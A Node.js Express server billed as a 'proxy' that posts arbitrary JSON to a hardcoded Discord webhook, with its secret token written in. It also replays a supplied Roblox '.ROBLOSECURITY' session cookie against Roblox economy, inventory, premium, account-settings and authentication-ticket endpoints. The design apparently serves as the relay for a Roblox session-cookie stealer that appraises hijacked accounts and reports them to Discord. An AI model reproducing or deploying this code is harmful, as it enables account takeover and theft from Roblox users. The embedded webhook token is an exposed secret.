const express = require('express');
const fetch = require('node-fetch');
const app = express();

app.use(express.json());

// Proxy for Discord webhook
app.post('/webhook', async (req, res) => {
  try {
    const discordUrl = 'https://discord.com/api/webhooks/1408203109129256990/95rPDczDFbDQt1IivQRsS_iwRFkOnAc21x8dNzFEvE5ud2UTIfNresN2-kGqcVBA864Z';
    const response = await fetch(discordUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(req.body),
    });
    if (!response.ok) {
      const errorText = await response.text();
      return res.status(response.status).json({ error: errorText });
    }
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Proxy for Roblox APIs
app.all('*', async (req, res) => {
  try {
    const { cookie } = req.body || {};
    let url = req.path;
    const baseUrlMap = {
      '/v1/users/': 'users.roblox.com',
      '/v1/user/': 'economy.roblox.com',
      '/v1/users/avatar': 'thumbnails.roblox.com',
      '/v1/users/assets/': 'inventory.roblox.com',
      '/v1/users/validate-membership': 'premiumfeatures.roblox.com',
      '/v1/account/settings': 'accountsettings.roblox.com',
      '/v1/authentication-ticket': 'auth.roblox.com',
      '/v1/groups/': 'groups.roblox.com',
    };
    let baseUrl = 'users.roblox.com';
    for (const [prefix, domain] of Object.entries(baseUrlMap)) {
      if (url.startsWith(prefix)) {
        baseUrl = domain;
        break;
      }
    }
    const fullUrl = `https://${baseUrl}${url}`;
    const response = await fetch(fullUrl, {
      method: req.method,
      headers: {
        'Content-Type': 'application/json',
        ...(cookie && { Cookie: `.ROBLOSECURITY=${cookie}` }),
      },
      body: req.method === 'POST' ? JSON.stringify({}) : null,
    });
    const data = await response.text();
    if (!response.ok) {
      return res.status(response.status).json({ error: data });
    }
    res.json(JSON.parse(data));
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

const port = process.env.PORT || 3000;
app.listen(port, () => console.log(`Proxy running on port ${port}`));
